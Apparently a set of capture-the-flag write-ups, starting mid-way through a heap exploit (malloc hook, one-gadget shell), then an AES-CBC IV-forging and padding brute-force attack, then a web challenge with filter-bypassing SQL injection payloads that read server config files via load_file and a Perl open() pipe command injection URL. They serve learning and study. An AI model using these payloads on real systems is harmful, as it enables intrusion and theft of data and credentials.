    to jump to - could be ROP chain but in our case a one gadget to “exec sh”.

6.  Allocating another string and jumping to the address.

**Some challenges:**

1.  Malloc checks the size of the allocated object so I found an offset before
    malloc hook such that it will contain 0x7 and pass the check (it checks only
    the relevant bits of the fastbin so it could be 0x71).

2.  The one gadget needed some register to be 0 and it contained the size of the
    allocation, so i’ve allocated a string of size 0.

Resources
---------

-   [The challenge](assignment)

-   [Full solution](solver.py)

-   [Ida file](assignment.i64)



### File: writeups/hitcon_cmt_17/prob/writeup.md

# HITCON CMT 17 - Prob Crypto Challenge

In the [challenge](prob.py) there is a service that communicates with a client in AES-CBC mode with standard PKCS#7 padding scheme. All messages are sent and received encrypted and we do not have the key.
However, we (as clients) do control the IV of the messages we send and the IV of the server remains constant (I think it is not crucial for solving this challenge though).
The service starts with sending a 'Welcome!!' message (encrypted) and waits for the client to send (encrypted) commands.
Although we do not have the key, we do control the IV. As the IV is xored with the message after the decryption (and before removing the padding), we can change the IV to send any message we want (as long as it's 15 bytes or shorter).
Here is the function for creating an `(IV,Cipher)` pair for certain message `msg_new`:
```python
def create_iv(msg, iv, msg_new):
    return xor(iv, pad(msg), pad(msg_new))

IV = create_iv('Welcome!!', iv_remote, 'get-flag')
Cipher = cipher_msg_welcome[:16]
```
The decryption of this pair is the `get-flag` command because the xoring with the IV is applied after decryption of the `cipher_msg_welcome[:16]` block.
The process is:
```
d0 = AES.decrypt(cipher_msg_welcome[:16])
d1 = d0 ^ IV
## which is equivalent to
d0 ^ iv_remote ^ pad('Welcome!!') ^ pad('get-flag')
## by creation of d0 and cipher_msg_welcome[:16] we know that
d0 ^ iv_remote == pad('Welcome!!')
## so we can assign it and get
pad('Welcome!!') ^ pad('Welcome!!') ^ pad('get-flag')
## which is equivalent to
pad('get-flag')
``` 
The service respond with an encryption message containing the flag.

Now we have the encrypted flag and we need to start finding the bytes of the flag denoted with `c_flag`, it is 2-blocks long (32 bytes).
We know from the service's source that the flag starts with `hitcon{`. Understanding  the padding scheme implementation, we can brute-force the last byte of the first block alone.
First, we send a message containing only the command `echo`. The service responds with encrypting the remaining part of the message, removing the `echo`.
```python
            elif msg.startswith('echo'):
                send_msg(msg[4:])
```
In this case, the respond is simply an encryption of and empty string denoted `c_empty`.
Next, we alter the `create_iv` function to allow forcing the `msg` last byte:
```python
def create_iv(msg, iv, msg_new, last_byte=-1):
    msg = pad(msg)
    if -1 != last_byte:
        msg = msg[:-1] + last_byte

   return xor(iv, msg, pad(msg_new))
```
and now we brute-force every possible last byte, sending:
```python
IV = create_iv('hitc', iv_remote, 'echo', last_byte)
Cipher = c_flag[:16]
```
when we hit the correct byte, the server response is identical to the empty response, because the decrypted last byte makes the `unpad` function remove exactly 12 bytes and the bytes that remain are the `echo` command.

After finding the last byte in the first block, we can brute-force the remaining bytes in the block on at a time. We create a message that start with the `echo` command and continues with the remaining known bytes of the flag plus the guessed byte. For example, if we know the flag starts with `hitcon{` and our guess is `0`, we send a message which is decrypted to `echoon{0`. The server response is the encryption of `on{0`. Next, we try to convert the flag's first block to the same message, sending `create_iv('hitcon{0', iv_remote, 'echoon{0' , last_byte)` as IV and `c_flag[:16]` as a cipher. If `0` is indeed the correct character, the service responds with the same cipher and we can check it by comparison to the cipher we received earlier.

Now that we found the first 16 bytes of the flag (15 bytes + last byte), we can't proceed with the same method as is. The decryption of the second block is xored with the cipher of the first block which we can't change in a predictable way. However, the `echo` command provides us with a very neat way to move the remaining parts of the flag to the first block.
By changing just the fist four bytes of the flag's IV to `echo`, the service responds with and encryption of the flag starting in the fourth byte (`flag[4:]`). 
Applying this method 3 times (note we know the first 12 bytes of the flag), we get the encryption of `flag[12:]` and we know the first 4 bytes of the clear-text (the last 4 bytes of the first block). So we can now use the same method we used on the first block to decrypt the next 12 bytes.

This is it, decrypting the next 12 bytes gives us the desired [flag](flag.txt).
You can find the full solution [here](ex.py)

	Many thank to @doronsobol who helped me clearing my head in unconventional hours



### File: writeups/misc_ctfs/Cobra/write-up.md

We need to upload a PGP public key file so the website will parse it.
The PGP can contain an SQLi in the email field. Michael A. wrote a script to make everything easier, 
The trick will now be the SQLi itself.

At first, we thought about fetching the users so we could use an activated user perhaps. 
To do this we must first find which table stores them.

## Basic SQLi
The server doesn't sanitize ', so we can just easily inject code.
However, the server does sanitize "union" and "select" among some special characters - the easiest way to check is entering 
a valid SQL query with testing AFTER the comment.

for instance the query

  email = "A' or 1 # union select ()<>?!%= "

Will return something along 
	"A' or 1 #<" 
(so just < isn't sanitized here)

**Incidentally every character is sanitized only once**, so

  email = "A' or 1 # == "

will return

  "A' or 1 # = "

## Getting the users table/columns (Ultimately not useful)  
[This](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet1 
) cheatsheet contains a lot of useful queries, like how to get a list of the tables and of columns:

To get (All) the tables we use:

  ```email = "A' UNunionION SELselectECT table_name,1,1,1,1 FROM information_schema.tables # "```

"table_name" has to be first, because only the first column is shown to the user.

The last table in the response is :

```"information_schema.tables # </br>[different key]</br>
(accounts) A' UNION SELECT table_name,1,1,1,1 FROM"```

So we can see the table name is "accounts"

To get all the coulmns from all of the tables we use:


  email = "A' UNunionION SELselectECT column_name,1,1,1,1 FROM information_schema.columns # "
  
Which returns 

 ```information_schema.columns # </br>[different key]</br>
(path) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>
(user_id) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>
(pass) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>
(activated) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>```


Too bad there are no activated users, which can be verified with 

  ```email = "A' UNunionION SELselectECT activated,1,1,1,1 FROM accounts"```

Trying to insert an activated user or to update one also didn't work...

## Solution

We're interested in the source code, but to know where it is we need to check lighttpd.conf first - because the website is powered by lighttpd.
We can't deliver straight ASCII, because we might have characters which will bang the SQL query.

We can use mySQL's load_file() to load a file, and hex() to encode it into hex:

So to get the [configuration](lighttpd.conf) we can use the following query:

```email = "A' UNunionION SELselectECT ()hex(load_file('/etc/lighttpd/lighttpd.conf')),1,1,1,1 #"```

The result contains the name of our [index page (source)](index.pl), to get it we use:

```email = "A' UNunionION SELselectECT ()hex(load_file('/var/www/html/public/index.pl')),1,1,1,1 #"```

Inside we can see that the flag is loaded from '../private/config.ini', so we get the flag:

```email = "A' UNunionION SELselectECT ()hex(load_file('/var/www/html/private/config.ini')),1,1,1,1 #"```

which gives us:

>[Database] Password=BlulS@ablul [CTF] Flag=ILov3P3rl43v3r



## RCE

Inside the index page there are no exec() or system() functions, so RCE is not really straight forward.
However, googling for "perl open() rce" landed me on [this](http://www.cgisecurity.com/lib/sips.html) page, which includes a section about how open() can be used for RCE:
>If the filename begins with "|", the filename is interpreted as a command to which output is to be piped, and if the filename ends with a "|", the filename is interpreted as a command which pipes output to us.

open() is being called from the get_template subroutine:

	sub get_template {
		my $filename = shift;

		open (FILE, $filename);
		my $output = <FILE>;
		close(FILE);

		return $output;
	}

Which is being called from  print_template:

	sub print_template {
		my $filename = shift;

		print get_template($filename);
	}

This function is called 3 times, each time with an argument from the list :

	my %templates = (
		header => 'templates/header.html',
		footer => 'templates/footer.html',
		form => 'templates/form.html',
		error => $query->param('error')
	);

"error" can be injected into, in the form of a parameter.
As I learned from [this](http://www.youtube.com/watch?v=noQcWra6sbU&t=6m33s) talk Perl has a weird way of expanding hashes using lists, and in CGI using one parameter multiple times will create a list.

We can use the same method to insert an arbitrary command to open.
Any of the other variables (header, footer or form) can be replaced with a command in the following way:

`http://<IP>/public/index.pl?error=e&error=form&error=|ls`

Where the second parameter will be the variable we want to inject into, and the third will be the command executed. 
We get the output piped to us.



